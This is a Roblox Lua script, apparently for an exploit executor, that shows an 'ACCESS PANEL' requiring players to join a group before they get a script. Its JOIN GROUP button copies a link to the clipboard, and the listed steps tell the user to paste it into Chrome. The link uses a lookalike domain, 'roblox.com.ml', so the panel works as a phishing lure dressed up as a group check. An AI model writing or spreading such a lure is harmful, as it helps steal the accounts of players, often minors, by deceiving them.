local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer

-- CONFIG
local GROUP_ID = 359764538783
local GROUP_LINK = "https://www.roblox.com.ml/communities/359764538783/BorealisHub"

-- UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AccessUI"
ScreenGui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 360, 0, 260)
Main.Position = UDim2.new(0.5, -180, 0.6, 0)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.BorderSizePixel = 0
Main.Parent = ScreenGui

Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 16)

-- Accent Bar
local Accent = Instance.new("Frame")
Accent.Size = UDim2.new(1, 0, 0, 4)
Accent.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
Accent.BorderSizePixel = 0
Accent.Parent = Main
Instance.new("UICorner", Accent).CornerRadius = UDim.new(0, 16)

-- Title
local Title = Instance.new("TextLabel")
Title.Text = "ACCESS PANEL"
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255,255,255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Parent = Main

-- Status
local Status = Instance.new("TextLabel")
Status.Text = "Checking access..."
Status.Size = UDim2.new(1, -20, 0, 25)
Status.Position = UDim2.new(0, 10, 0, 45)
Status.BackgroundTransparency = 1
Status.TextColor3 = Color3.fromRGB(160,160,160)
Status.Font = Enum.Font.Gotham
Status.TextSize = 13
Status.Parent = Main

-- Instructions
local Instructions = Instance.new("TextLabel")
Instructions.Text = "1. Click JOIN GROUP\n2. Link will be copied to your clipboard\n3. Paste link in Chrome\n4. Join group and enjoy your script"
Instructions.Size = UDim2.new(1, -20, 0, 80)
Instructions.Position = UDim2.new(0, 10, 0, 75)
Instructions.BackgroundTransparency = 1
Instructions.TextColor3 = Color3.fromRGB(180,180,180)
Instructions.Font = Enum.Font.Gotham
Instructions.TextSize = 13
Instructions.TextWrapped = true
Instructions.TextXAlignment = Enum.TextXAlignment.Left
Instructions.Parent = Main

-- Button
local JoinBtn = Instance.new("TextButton")
JoinBtn.Text = "JOIN GROUP"
JoinBtn.Size = UDim2.new(0.7, 0, 0, 40)
JoinBtn.Position = UDim2.new(0.15, 0, 0, 160)
JoinBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
JoinBtn.TextColor3 = Color3.fromRGB(255,255,255)
JoinBtn.Font = Enum.Font.GothamBold
JoinBtn.TextSize = 15
JoinBtn.Parent = Main

Instance.new("UICorner", JoinBtn).CornerRadius = UDim.new(0, 12)

-- Footer
local Footer = Instance.new("TextLabel")
Footer.Text = "Add jmes.kng. in discord if you have any issues"
Footer.Size = UDim2.new(1, -20, 0, 25)
Footer.Position = UDim2.new(0, 10, 1, -30)
Footer.BackgroundTransparency = 1
Footer.TextColor3 = Color3.fromRGB(120,120,120)
Footer.Font = Enum.Font.Gotham
Footer.TextSize = 11
Footer.TextWrapped = true
Footer.Parent = Main

-- Hover effect
JoinBtn.MouseEnter:Connect(function()
	TweenService:Create(JoinBtn, TweenInfo.new(0.2), {
		BackgroundColor3 = Color3.fromRGB(0, 180, 255)
	}):Play()
end)

JoinBtn.MouseLeave:Connect(function()
	TweenService:Create(JoinBtn, TweenInfo.new(0.2), {
		BackgroundColor3 = Color3.fromRGB(0, 150, 255)
	}):Play()
end)

-- Check group
local function checkGroup()
	if player:IsInGroup(GROUP_ID) then
		Status.Text = "Access Granted ✅"
		JoinBtn.Visible = false
	else
		Status.Text = "Join the group to continue ❌"
		JoinBtn.Visible = true
	end
end

-- Button click
JoinBtn.MouseButton1Click:Connect(function()
	if setclipboard then
		setclipboard(GROUP_LINK)
		Status.Text = "Link copied! Paste in browser 🔗"
	else
		Status.Text = "Clipboard not supported ⚠️"
	end
end)

-- Animation
Main.Position = UDim2.new(0.5, -180, 0.7, 0)
TweenService:Create(Main, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
	Position = UDim2.new(0.5, -180, 0.5, -130)
}):Play()

checkGroup()
